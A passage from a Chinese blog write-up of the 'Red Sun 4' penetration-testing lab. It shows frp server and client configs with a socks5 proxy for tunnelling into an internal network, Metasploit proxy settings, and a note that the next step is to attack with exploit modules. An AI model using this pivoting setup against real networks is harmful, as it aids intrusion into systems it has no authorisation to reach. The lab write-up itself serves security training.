+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>       <br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">8000</span>           <br><span class="hljs-attr">dashboard_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>   <br><span class="hljs-attr">dashboard_port</span> = <span class="hljs-number">7600</span>      <br><span class="hljs-attr">dashboard_user</span> = root       <br><span class="hljs-attr">dashboard_pwd</span>  = <span class="hljs-number">123456</span>    <br><span class="hljs-attr">token</span> = <span class="hljs-number">1</span>q2w3e             <br><span class="hljs-attr">heartbeat_timeout</span> = <span class="hljs-number">90</span>     <br><span class="hljs-attr">max_pool_count</span> = <span class="hljs-number">5</span><br><br></code></pre></td></tr></table></figure>
+
+<p>配置文件frpc.ini</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">80.128</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">8000</span><br><span class="hljs-attr">token</span> = <span class="hljs-number">1</span>q2w3e<br><br><br><span class="hljs-section">[proxies]</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">6000</span>  <br><span class="hljs-attr">plugin</span> = socks5         <br><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span>   <br><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frps -<span class="hljs-keyword">c</span> frps.ini 服务端执行<br>frpc -<span class="hljs-keyword">c</span> frpc.ini  客户端执行<br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304030902944.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>成功连接</p>
+<p>然后配置一下msf即可</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">setg</span> Proxies socks5:<span class="hljs-number">127.0.0.1:6000</span><br>set ReverseAllowProxy <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202304030907980.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>成功连接到内网机并且扫描到漏洞</p>
+<p>接下来直接用攻击模块攻击</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BAwp/">#靶场wp</a>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>红日靶场4</div>
+      <div>http://example.com/2023/04/02/红日靶场4/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>QY</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/11/burpsuite%E9%9D%B6%E5%9C%BAcsrf/" title="burpsuite靶场csrf">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">burpsuite靶场csrf</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/01/sova%E5%AE%9E%E7%94%A8%E6%8E%A2%E6%B5%8B%E7%AE%AD/" title="sova实用探测箭">
+                        <span class="hidden-mobile">sova实用探测箭</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://lib.baomitu.com/waline/2.6.3/waline.min.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/waline/2.6.3/waline.min.js', function() {
+        var options = Object.assign(
+          {"serverURL":"blog-fakerwe.vercel.app","placeholder":"遗憾莫过于难忘你的背影，却找不到你来过的痕迹 ...","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":true,"avatarCDN":"","avatarForce":false,"requiredFields":[],"emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"]},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
